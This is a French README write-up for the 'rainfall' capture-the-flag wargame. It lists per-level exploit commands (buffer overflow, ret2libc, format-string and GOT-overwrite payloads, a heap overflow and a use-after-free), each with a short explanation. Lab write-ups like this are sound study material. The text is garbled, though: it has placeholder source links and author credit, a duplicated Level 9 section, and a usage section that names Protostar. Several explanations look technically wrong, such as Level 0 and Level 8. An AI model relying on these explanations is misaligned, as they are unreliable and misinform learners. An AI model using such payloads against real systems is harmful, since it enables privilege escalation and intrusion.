# rainfall
## Level 0

**Exploit**: Buffer Overflow simple  
**Commande**: `./level0 423`  
**Explication**: Dans ce cas, l'exploit consiste à profiter d'une vulnérabilité de débordement de tampon. En passant l'argument 423 au programme level0, nous dépassons la taille du tampon prévu, ce qui nous permet d'écraser des données adjacentes en mémoire, y compris l'adresse du pointeur de retour. Cela nous permet de contrôler le flux d'exécution et d'obtenir le contenu du fichier .pass de l'utilisateur level1.

**Sources**:
- Aucune

---

## Level 1

**Exploit**: Buffer Overflow avec redirection de flux d'exécution  
**Commande**: `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit2; cat /tmp/exploit - | ./level1`  
**Explication**: Dans cet exploit, nous avons dépassé la taille du tampon prévu en imprimant 76 caractères "a", suivis de l'adresse 0x08 04 84 44, qui est l'adresse de la fonction run. Cette adresse sera utilisée comme nouvelle adresse de retour, ce qui nous permettra de rediriger l'exécution vers la fonction run.

**Sources**:

- [Détails sur Buffer Overflow avec redirection](lien_vers_la_source)
- [Vidéo YouTube sur Buffer Overflow](lien_vers_la_source)

---

## Level 2

**Exploit**: Return-to-libc (ret2libc)  
**Commande**: `python -c 'print "a" * 80 + "\x3e\x85\x04\x08"  + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/exploit3`  
**Explication**: Dans cet exploit, nous utilisons la technique ret2libc pour contourner les protections de sécurité. Nous utilisons les adresses des fonctions system, exit et /bin/sh de la bibliothèque libc pour exécuter une coquille système avec les privilèges de l'utilisateur.

**Sources**:

- [Guide pratique sur ret2libc](lien_vers_la_source)
- [Exploitation de Buffer Overflow avec ret2libc](lien_vers_la_source)

---

## Level 3

**Exploit**: Attaque de chaîne de format  
**Commande**: `python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"' > /tmp/exploit4; cat /tmp/exploit4 - | ./level3`  
**Explication**: L'exploit ici repose sur une vulnérabilité de chaîne de format. Nous utilisons la spécification %4$n pour écrire le nombre de caractères déjà imprimés dans la pile à l'adresse mémoire pointée par le quatrième argument sur la pile (qui est l'adresse de retour). Cela nous permet de contrôler le flux d'exécution.

**Sources**:

- [Guide sur l'attaque de chaîne de format](lien_vers_la_source)
- [Exploitation de chaînes de format](lien_vers_la_source)

---

## Level 4

**Exploit**: Format String avec écriture arbitraire  
**Commande**: `python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit4`  
**Explication**: Dans cet exploit, nous utilisons la vulnérabilité de chaîne de format pour écrire une valeur arbitraire dans la mémoire. Nous écrasons l'adresse de retour avec l'adresse de la fonction info pour afficher le contenu de la mémoire.

**Sources**:

- [Exploitation de chaînes de format](lien_vers_la_source)
- [Guide sur ret2libc](lien_vers_la_source)

...

## Level 5

**Exploit**: GOT Overwrite  
**Commande**: `python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit5`  
**Explication**: Dans cet exploit, nous écrasons une entrée dans la table GOT pour rediriger l'exécution vers notre propre code. Nous écrasons l'adresse de la fonction o dans la table GOT avec l'adresse de la fonction system.

**Sources**:

- [Explication sur GOT Overwrite](lien_vers_la_source)
- [Guide sur Buffer Overflow](lien_vers_la_source)

---

## Level 6

**Exploit**: Buffer Overflow avec shellcode  
**Commande**: `$(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')`  
**Explication**: Ici, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour avec l'adresse de la fonction m(). Ensuite, nous exécutons un shellcode pour obtenir un shell interactif.

**Sources**:

- [Détails sur Buffer Overflow avec shellcode](lien_vers_la_source)
- [Guide sur l'exploitation de niveaux de Protostar](lien_vers_la_source)

---

## Level 7

**Exploit**: Heap Overflow  
**Commande**: `"$(python -c "print 'AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08'")" $(python -c "print '\xf4\x84\x04\x08'")`  
**Explication**: Dans cet exploit, nous exploitons une vulnérabilité de débordement du tas. Nous écrasons les métadonnées du tas pour rediriger l'exécution vers la fonction m(). Cela nous permet d'exécuter du code arbitraire.

**Sources**:

- [Explication sur Heap Overflow](lien_vers_la_source)
- [Guide sur Heap Overflow](lien_vers_la_source)

---

## Level 8

**Exploit**: Use-After-Free  
**Commande**: `auth a; reset; service; service; service; login`  
**Explication**: Dans cet exploit, nous exploitons une vulnérabilité Use-After-Free. Nous libérons un objet, puis nous l'utilisons à nouveau pour exécuter un shell interactif. Cela se produit car l'objet libéré n'est pas correctement désalloué.

**Sources**:

- [Explication sur Use-After-Free](lien_vers_la_source)
- [Guide sur Use-After-Free](lien_vers_la_source)

---

## Level 9

**Exploit**: Buffer Overflow avec shellcode  
**Commande**: `$(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYYZZZZAAA' + '\x60\x60\xd8\xb7' + '\xe0\x9b\xd7\xb7' + '\xf4\x84\x04\x08' + '\x58\x7c\xea\xb7' ")`  
**Explication**: Comme dans les exploits précédents, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour et exécuter un shell interactif.

**Sources**:

- [Explication sur Buffer Overflow avec shellcode](lien_vers_la_source)
- [Guide sur l'exploitation de niveaux de Protostar](lien_vers_la_source)

---

## Level 9

**Exploit**: Buffer Overflow avec shellcode  
**Commande**: `$(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYYZZZZAAA' + '\x60\x60\xd8\xb7' + '\xe0\x9b\xd7\xb7' + '\xf4\x84\x04\x08' + '\x58\x7c\xea\xb7' ")`  
**Explication**: Comme dans les exploits précédents, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour et exécuter un shell interactif.

**Sources**:

- [Explication sur Buffer Overflow avec shellcode](lien_vers_la_source)
- [Guide sur l'exploitation de niveaux de Protostar](lien_vers_la_source)

---

## Comment utiliser ce dépôt

1. Clonez ce dépôt sur votre machine locale.
2. Naviguez dans le répertoire du niveau que vous souhaitez étudier.
3. Consultez le fichier `README.md` pour les détails de l'exploit et les commandes utilisées.
4. Exécutez les commandes sur votre système Protostar pour observer les résultats.

---

Ce write-up a été préparé avec soin par [VotreNom](lien_vers_votre_profil_GitHub).

**Disclaimer**: Ces exploits ont été conçus à des fins éducatives et d'apprentissage. Ne les utilisez pas à des fins malveillantes.
